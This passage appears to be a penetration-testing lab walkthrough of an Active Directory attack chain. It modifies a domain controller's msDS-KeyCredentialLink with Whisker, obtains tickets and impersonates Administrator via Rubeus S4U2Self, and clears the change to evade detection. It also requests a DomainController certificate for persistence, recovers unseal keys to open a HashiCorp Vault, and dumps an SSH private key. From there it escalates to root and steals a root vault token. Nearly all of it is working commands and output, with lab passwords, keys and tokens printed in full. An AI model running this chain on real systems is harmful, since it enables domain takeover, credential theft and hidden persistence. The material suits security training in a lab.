- We will use the `cb\mgmtadmin` GenericWrite permissions over `cb\cb-ca$` to modify the target account's `msDS-KeyCredentialLink` attribute and append it with alternate credentials in the form of certificates.
- First we will list the `msDS-KeyCredentialLink` attribute of the target server.
```powershell
PS C:\ADCS\Auditor> .\Whisker.exe list /target:cb-ca$ /domain:cb.corp /dc:cb-ca.cb.corp
[*] Searching for the target account
[*] Target user found: CN=CB-CA,OU=Domain Controllers,DC=cb,DC=corp
[*] Listing deviced for cb-ca$:
[*] No entries!
```

- Now we will modify the attribute.
```powershell
PS C:\ADCS\Auditor> .\Whisker.exe add /target:cb-ca$ /domain:cb.corp /dc:cb-ca.cb.corp
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password GIOKHt4rLq2xrz9b
[*] Searching for the target account
[*] Target user found: CN=CB-CA,OU=Domain Controllers,DC=cb,DC=corp
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID ee6cdbb9-6606-4236-aa34-9ae703ab6ed6
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:cb-ca$ /certificate:MIIJwAIBA... /password:"GIOKHt4rLq2xrz9b" /domain:cb.corp /dc:cb-ca.cb.corp /getcredentials /show
```

- Let's verify that the attribute has indeed been modified.
```powershell
PS C:\ADCS\Auditor> .\Whisker.exe list /target:cb-ca$ /domain:cb.corp /dc:cb-ca.cb.corp
[*] Searching for the target account
[*] Target user found: CN=CB-CA,OU=Domain Controllers,DC=cb,DC=corp
[*] Listing deviced for cb-ca$:
    DeviceID: ee6cdbb9-6606-4236-aa34-9ae703ab6ed6 | Creation Time: 9/21/2023 1:58:23 AM
```

- Let's use the generated certificate to request a TGT as `cb\cb-ca$`.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:cb-ca$ /certificate:MIIJwAIBA... /password:"GIOKHt4rLq2xrz9b" /domain:cb.corp /dc:cb-ca.cb.corp /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=cb-ca$
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cb.corp\cb-ca$'
[*] Using domain controller: 172.16.10.1:88

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 6513F4CB9F31A683F175D2043AE783D7
```

- We will now use the generated TGT to execute a _S4U2Self_ attack to impersonate `cb\administrator` and request a TGS for the `http` service.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:http/cb-ca.cb.corp /dc:cb-ca.cb.corp /ptt /nowrap /ticket:doIGCDCCBgS...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'cb-ca$@CB.CORP'
[*] Using domain controller: cb-ca.cb.corp (172.16.10.1)
[*] Sending S4U2self request to 172.16.10.1:88
[+] S4U2self success!
[*] Substituting alternative service name 'http/cb-ca.cb.corp'
[*] Got a TGS for 'Administrator' to 'http@CB.CORP'
[*] base64(ticket.kirbi):

<snip>

[+] Ticket successfully imported!
PS C:\ADCS\Auditor>
```

- Let's now access `CB-CA` with the generated ticket.
```powershell
PS C:\ADCS\Auditor> winrs -r:cb-ca.cb.corp powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator.CB-CA> hostname;whoami
hostname;whoami
cb-ca
cb\administrator
```

- Now we can clear the edited attribute to cover our tracks and be stealthier.
- We will need to either request an additional TGS for the service `ldap` impersonating the administrator or use the previous `cb\mgmtadmin` certificate to impersonate `cb\mgmtadmin`.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:ldap/cb-ca.cb.corp /dc:cb-ca.cb.corp /ptt /ticket:doIGCDCCBg

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'cb-ca$@CB.CORP'
[*] Using domain controller: cb-ca.cb.corp (172.16.10.1)
[*] Sending S4U2self request to 172.16.10.1:88
[+] S4U2self success!
[*] Substituting alternative service name 'ldap/cb-ca.cb.corp'
[*] Got a TGS for 'Administrator' to 'ldap@CB.CORP'
[*] base64(ticket.kirbi):

<snip>

[+] Ticket successfully imported!

PS C:\ADCS\Auditor> .\Whisker.exe remove /target:cb-ca$ /domain:cb.corp /dc:cb-ca.cb.corp /deviceid:ee6cdbb9-6606-4236-aa34-9ae703ab6ed6
[*] Searching for the target account
[*] Target user found: CN=CB-CA,OU=Domain Controllers,DC=cb,DC=corp
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Found value to remove
[+] Updated the msDS-KeyCredentialLink attribute of the target object

PS C:\ADCS\Auditor> .\Whisker.exe list /target:cb-ca$ /domain:cb.corp /dc:cb-ca.cb.corp
[*] Searching for the target account
[*] Target user found: CN=CB-CA,OU=Domain Controllers,DC=cb,DC=corp
[*] Listing deviced for cb-ca$:
[*] No entries!
```

#### Post-Exploitation ####
- We have acquired a certificate for the EA from our previous compromisation steps. We can now request a certificate for `cb\cb-ca$` to establish long-term persistence [[1. Theory/2. ADCS Abuses/2. PERSIST/PERSIST2]] to the Enterprise DC/CA.
```powershell
PS C:\Windows\Tasks> .\CertifyKit.exe request /ca:cb-ca.cb.corp\cb-ca /machine /template:DomainController
.\CertifyKit.exe request /ca:cb-ca.cb.corp\cb-ca /machine /template:DomainController
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: Request a Certificates
[*] Elevating to SYSTEM context for machine cert request

[*] Current user context    : NT AUTHORITY\SYSTEM
[*] No subject name specified, using current machine as subject

[*] Template                : DomainController
[*] Subject                 : CN=cb-ca.cb.corp

[*] Certificate Authority   : cb-ca.cb.corp\cb-ca

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 62

<snip>
```


### **CB-VAULT** ###
#### Exploitation ####
- This is the last server that we have not explored so far. From the [[1. Enumeration]] phase we remember that a HashiCorp Vault has been set up in our environment.
- This product allows us to secure, store, and tightly control access to tokens, passwords, certificates, and encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API.
- Hashicorp Vault by default listens to port `8200`. We can try to see if it is there on **CB-VAULT**.
![[vault_page.png]]

- The vault is sealed. According to the instructions _To begin using the vault for these operations contact studentadmin and signadmin to use their respective decryption keys to unseal the vault._
- We can connect to the vault using the `vault.exe` binary in `PowerShell` or `CMD`.
- Let's check the status of the vault.
```powershell
PS C:\ADCS\Auditor> .\vault.exe status -address=https://cb-vault.certbulk.cb.corp:8200
Key                Value
---                -----
Seal Type          shamir
Initialized        true
Sealed             true
Total Shares       3
Threshold          2
Unseal Progress    0/2
Unseal Nonce       n/a
Version            1.13.1
Build Date         2023-03-23T12:51:35Z
Storage Type       file
HA Enabled         false
```

- The vault is sealed. According to the instructions, we have to process 2 different tokens, from `certbulk\studentadmin` and `certbulk\signadmin` to unseal it.
- Since we compromised both users, let's search in the respective servers for the tokens.
- We will use the certificates we have already exfiltrated ti impersonate the users and gain access to the servers they have administrative rights.
```powershell
PS C:\Users\studentadmin> Get-ChildItem -Recurse -Path C:\ -Include *.key -ErrorAction SilentlyContinue -Force
Get-ChildItem -Recurse -Path C:\ -Include *.key -ErrorAction SilentlyContinue -Force


    Directory: C:\Documents and Settings\studentadmin\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/21/2023   6:25 AM             66 studentadmin-vaultunseal.key

<snip>

PS C:\Users\studentadmin\Documents> type .\studentadmin-vaultunseal.key
type .\studentadmin-vaultunseal.key
5678bc88a053c74ccc74510eafd599b08f9aa1929fbd428fa58101d80b5fa053fc
```

```powershell
PS C:\Users\signadmin> Get-ChildItem -Recurse -Path C:\ -Include *.key -ErrorAction SilentlyContinue -Force
Get-ChildItem -Recurse -Path C:\ -Include *.key -ErrorAction SilentlyContinue -Force


    Directory: C:\Documents and Settings\signadmin\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/21/2023   6:31 AM             66 signadmin-vaultunseal.key

<snip>

PS C:\Users\signadmin\Documents> type .\signadmin-vaultunseal.key
type .\signadmin-vaultunseal.key
799fc7e3c9e356a6ec9c6bb8eece7ade89cc0cf1a8a74417561ef119b5ec932d29
```

- Let's unseal the vault now.
```powershell
PS C:\ADCS\Auditor> .\vault.exe operator unseal -address=https://cb-vault.certbulk.cb.corp:8200
Unseal Key (will be hidden):
Key                Value
---                -----
Seal Type          shamir
Initialized        true
Sealed             true
Total Shares       3
Threshold          2
Unseal Progress    1/2
Unseal Nonce       681c6ff2-f12f-eca5-ffec-77260ac39137
Version            1.13.1
Build Date         2023-03-23T12:51:35Z
Storage Type       file
HA Enabled         false
PS C:\ADCS\Auditor> .\vault.exe operator unseal -address=https://cb-vault.certbulk.cb.corp:8200
Unseal Key (will be hidden):
Key             Value
---             -----
Seal Type       shamir
Initialized     true
Sealed          false
Total Shares    3
Threshold       2
Version         1.13.1
Build Date      2023-03-23T12:51:35Z
Storage Type    file
Cluster Name    vault-cluster-d7a23051
Cluster ID      041379ee-d242-feed-311d-9a792d98172f
HA Enabled      false
```

- Now the vault is unsealed! Let's authenticate to start digging in for valuable secrets.
```powershell
PS C:\ADCS\Auditor> .\vault.exe login -address=https://cb-vault.certbulk.cb.corp:8200 -method=ldap username=studentadmin
Password (will be hidden): IW!LLAdministerStud3nts!
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                    Value
---                    -----
token                  hvs.CAESIPu6KrQ3uMM9WUsLN-ng-GkbMZg0PjYHiT024hbqZ2KbGh4KHGh2cy5lekZzNnVxZFRKOHV4MllOYWtmZzVZWVQ
token_accessor         3IW441e8L6x9QiqyKA7R8vpv
token_duration         768h
token_renewable        true
token_policies         ["default" "vaultusers"]
identity_policies      []
policies               ["default" "vaultusers"]
token_meta_username    studentadmin

PS C:\ADCS\Auditor> .\vault.exe secrets list -address=https://cb-vault.certbulk.cb.corp:8200
Path                     Type         Accessor              Description
----                     ----         --------              -----------
VPN Configs/             kv           kv_ee0a6a89           n/a
cubbyhole/               cubbyhole    cubbyhole_09122067    per-token private secret storage
identity/                identity     identity_f41a549c     identity store
ssh-client-signer/       ssh          ssh_fa27aa72          n/a
studentadmin_sshkeys/    kv           kv_508a7564           n/a
sys/                     system       system_619fac9c       system endpoints used for control, policy and debugging
```

- _VPN Configs_, _ssh-client-signer_ and _studentadmin_sshkeys_ look very interesting. Let's try to list their secrets.
-> _VPN Configs_ 
```powershell
PS C:\ADCS\Auditor> .\vault.exe kv list -address=https://cb-vault.certbulk.cb.corp:8200 "VPN Configs"
Error making API request.

URL: GET https://cb-vault.certbulk.cb.corp:8200/v1/sys/internal/ui/mounts/VPN%20Configs
Code: 403. Errors:

* preflight capability check returned 403, please ensure client's policies grant access to path "VPN Configs/"
```

-> _studentadmin_sshkeys_
```powershell
PS C:\ADCS\Auditor> .\vault.exe kv list -address=https://cb-vault.certbulk.cb.corp:8200 "studentadmin_sshkeys"
Keys
----
studentadmin_sshkeys

PS C:\ADCS\Auditor> .\vault.exe kv list -address=https://cb-vault.certbulk.cb.corp:8200 "studentadmin_sshkeys/studentadmin_sshkeys"
No value found at studentadmin_sshkeys/metadata/studentadmin_sshkeys

PS C:\ADCS\Auditor> .\vault.exe kv get -address=https://cb-vault.certbulk.cb.corp:8200 "studentadmin_sshkeys/studentadmin_sshkeys"
================= Secret Path =================
studentadmin_sshkeys/data/studentadmin_sshkeys

======= Metadata =======
Key                Value
---                -----
created_time       2023-03-05T20:21:51.548785635Z
custom_metadata    <nil>
deletion_time      n/a
destroyed          false
version            1

======= Data =======
Key            Value
---            -----
Private Key    -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
Public Key     ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQeH908sYyD+nEiTji3tPYW9NFWfhJxGg0bAUC1UIW5YQKCxCCfu0eb2ZQaPXTrM+BjKDkJfXIEycF3jMbJmtoe1WVF9pUrKiiRCosmjaQe5YsF9YqzV30WjRmL13xfowg4XmcWJ+QfdzJEXFbycFXvmaNUTT5lGThVNEnYV02nc1xJcLevIt7QoansqfSRa1EdJPt/lhsoHo7wmQ8Q4vS3VWqdjlNJVlv/abkA50eSs4JiveQ2HQaacjB2UgcUbhBo84HkqKQfytZdFP1fPcNXdBtnCQ87ciDFvjKf1JgRUbia9t53MvJYdxlfGF+3loJfsbOim7KnQh8X4WLKrGM4iAtR6XcpSCHylW9s28QvH77Ua+CV9kS/mRvF7sIjCqHywfT2iZTeE4EKjcOAeN7JXI494E77UpKzU634HMmT9HOxt7wf01PUbvXVSCpEeIzRueclF52K+6eQXbJE4nK4ZRgpXrmXWhZ+bVHtrjdFgkqBCIQNRv/6AbhYdmdOTM= studentadmin@certbulk.cb.corp
```

-> Save the PRIVATE KEY and PUBLIC KEY to separate files named `id_rsa` and `id_rsa.pub` respectively and disable inheritance (Right click on file -> Properties -> Security -> Advanced -> Disable Inheritance -> Remove all Inherited Permissions from this Object -> Add -> Select a principal -> `student33` -> Check names -> Ok -> Full Control -> Apply).
-> In the PRIVATE KEY, append a null line in the bottom of the private key.

- Let's now read the content of `ssh-client-signer` according to [Hashicorp's Medium article](https://www.hashicorp.com/blog/managing-ssh-access-at-scale-with-hashicorp-vault)
```powershell
PS C:\ADCS\Auditor> .\vault.exe list -address=https://cb-vault.certbulk.cb.corp:8200 "ssh-client-signer/roles"
Keys
----
studentadmin-role

PS C:\ADCS\Auditor> .\vault.exe read -address=https://cb-vault.certbulk.cb.corp:8200 "ssh-client-signer/roles/studentadmin-role"
Key                            Value
---                            -----
algorithm_signer               rsa-sha2-256
allow_bare_domains             false
allow_host_certificates        false
allow_subdomains               false
allow_user_certificates        true
allow_user_key_ids             false
allowed_critical_options       n/a
allowed_domains                n/a
allowed_domains_template       false
allowed_extensions             permit-pty,permit-port-forwarding
allowed_user_key_lengths       map[]
allowed_users                  studentadmin
allowed_users_template         false
default_critical_options       map[]
default_extensions             map[permit-pty:]
default_extensions_template    false
default_user                   studentadmin
default_user_template          false
key_id_format                  n/a
key_type                       ca
max_ttl                        0s
not_before_duration            30s
ttl                            30m
```

- From the output above, and by reading the resource cited above, we understand that we can submit our public ssh key for signing as `certbulk\studentadmin`.
- The validity period of the signed public ssh key will be 30 minutes.
- Let's try to submit our public key for signing. First impersonate `certbulk\studentadmin`.
```powershell
PS C:\ADCS\Auditor> .\vault.exe write -address=https://cb-vault.certbulk.cb.corp:8200 -field=signed_key ssh-client-signer/sign/studentadmin-role public_key=@'C:\ADCS\Auditor\Loot\id_rsa.pub'
ssh-rsa-cert-v01@openssh.com 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
```

- Assign the output above to a file `id_rsa_signed.pub` and apply the same ownership permissions as described above.
- Use the signed public key and the private key to connect to `CB-VAULT` via SSH.
```powershell
PS C:\ADCS\Auditor\Loot> ssh.exe -i .\id_rsa -i .\id_rsa_signed.pub studentadmin@cb-vault.certbulk.cb.corp
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 21 10:20:53 AM UTC 2023

  System load:  0.080078125        Processes:             115
  Usage of /:   31.6% of 27.39GB   Users logged in:       0
  Memory usage: 18%                IPv4 address for eth0: 172.16.67.55
  Swap usage:   0%


66 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jun 15 12:22:43 2023 from 172.16.100.1
```

#### Post-Exploitation ####
- Let's see if we are in any interesting groups.
```bash
studentadmin@cb-vault:~$ id
uid=918601104(studentadmin) gid=918600513(domain users) groups=918600513(domain users),918601114(sudoers),918601116(vaultusers)
```

- We notice that we are in the **sudoers** domain group. Let's try to elevate our privileges.
```bash
studentadmin@cb-vault:~$ sudo su
[sudo] password for studentadmin: IW!LLAdministerStud3nts!
root@cb-vault:/home/studentadmin#
```

- Users in the home directory do not have anything valuable. The root user though has some interesting things.
```bash
root@cb-vault:~# ls -al
total 64
drwx------  7 root root  4096 Jun  6 13:59 .
drwxr-xr-x 19 root root  4096 Jan  3  2023 ..
-rw-------  1 root root   123 Jun 15 12:22 .bash_history
-rw-r--r--  1 root root  3229 Mar  8  2023 .bashrc
drwxr-xr-x  3 root root  4096 Mar  2  2023 .cache
-rw-------  1 root root    20 Jan 12  2023 .lesshst
drwxr-xr-x  3 root root  4096 Jan  4  2023 .local
drwxr-xr-x  3 root root  4096 Apr 21 07:32 .pki
-rw-r--r--  1 root root   161 Jul  9  2019 .profile
drwx------  3 root root  4096 Jan  3  2023 snap
drwx------  2 root root  4096 Jan  3  2023 .ssh
-rw-r--r--  1 root root     0 Jan  8  2023 .sudo_as_admin_successful
-rw-------  1 root root    28 Mar  9  2023 .vault-token
-rw-------  1 root root 11512 Jun  6 13:59 .viminfo
-rw-r--r--  1 root root   181 Apr 20 16:59 .wget-hsts
root@cb-vault:~# ls -al .pki/
total 12
drwxr-xr-x 3 root root 4096 Apr 21 07:32 .
drwx------ 7 root root 4096 Jun  6 13:59 ..
drwxr-xr-x 2 root root 4096 Apr 21 07:32 internal_nssdb
root@cb-vault:~# ls -al .pki/internal_nssdb/
total 76
drwxr-xr-x 2 root root  4096 Apr 21 07:32 .
drwxr-xr-x 3 root root  4096 Apr 21 07:32 ..
-rw------- 1 root root 28672 Apr 21 07:32 cert9.db
-rw------- 1 root root 36864 Apr 21 07:32 key4.db
-rw------- 1 root root   432 Apr 21 07:32 pkcs11.txt
root@cb-vault:~# cat .vault-token
hvs.QN7LuerNrmgw0Vl1zVYuDnG9root@cb-vault:~#
```

- We now have a vault token and some .`db` files.
- Let's use the token to locally authenticate to the vault as `root`.
```bash
root@cb-vault:~# vault login -method=token hvs.QN7LuerNrmgw0Vl1zVYuDnG9
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.QN7LuerNrmgw0Vl1zVYuDnG9
token_accessor       lZmx5Ks740vDtRBYDuNGycxM
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
```

- We can now enumerate the vault secrets that `root` has access to.
```bash
root@cb-vault:~# vault secrets list
Path                     Type         Accessor              Description
----                     ----         --------              -----------
VPN Configs/             kv           kv_ee0a6a89           n/a
cubbyhole/               cubbyhole    cubbyhole_09122067    per-token private secret storage
identity/                identity     identity_f41a549c     identity store
ssh-client-signer/       ssh          ssh_fa27aa72          n/a
studentadmin_sshkeys/    kv           kv_508a7564           n/a
sys/                     system       system_619fac9c       system endpoints used for control, policy and debugging
```

- We can check if we now have access, as root, to the secrets of _VPN Configs_.
```bash
root@cb-vault:~# vault kv list "VPN Configs"
Keys
----
TLS_Cert_Backup
internalcb_sample_vpn_config

root@cb-vault:/home/studentadmin# vault kv list "VPN Configs/TLS_Cert_Backup"
No value found at VPN Configs/metadata/TLS_Cert_Backup

root@cb-vault:/home/studentadmin# vault kv list "VPN Configs/internalcb_sample_vpn_config"
No value found at VPN Configs/metadata/internalcb_sample_vpn_config

root@cb-vault:/home/studentadmin# vault kv get "VPN Configs/TLS_Cert_Backup"
========== Secret Path ==========
VPN Configs/data/TLS_Cert_Backup

======= Metadata =======
Key                Value
---                -----
created_time       2023-03-09T09:48:08.726500182Z
custom_metadata    <nil>
deletion_time      n/a
destroyed          false
version            1

======= Data =======
Key            Value
---            -----
